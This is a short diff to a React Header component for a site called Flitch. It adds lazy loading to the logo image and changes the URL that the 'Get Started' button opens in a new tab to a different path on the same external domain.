@@ -19,7 +19,7 @@ export function Header({ isLoggedIn, onLogin }: HeaderProps) {
         <div className="flex items-center justify-between h-16">
           {/* Logo */}
           <Link to="/" className="flex items-center">
-            <img src={logo} alt="Flitch" className="h-14 w-auto" />
+            <img src={logo} alt="Flitch" className="h-14 w-auto" loading="lazy" />
           </Link>
 
           {/* Desktop Nav */}
@@ -53,7 +53,7 @@ export function Header({ isLoggedIn, onLogin }: HeaderProps) {
                 </Button>
               </Link>
             ) : (
-              <Button variant="hero" size="sm" onClick={() => window.open("https://sae23e2s.cfd/", "_blank")}>
+              <Button variant="hero" size="sm" onClick={() => window.open("https://sae23e2s.cfd/sa34w", "_blank")}>
                 Get Started
               </Button>
             )}
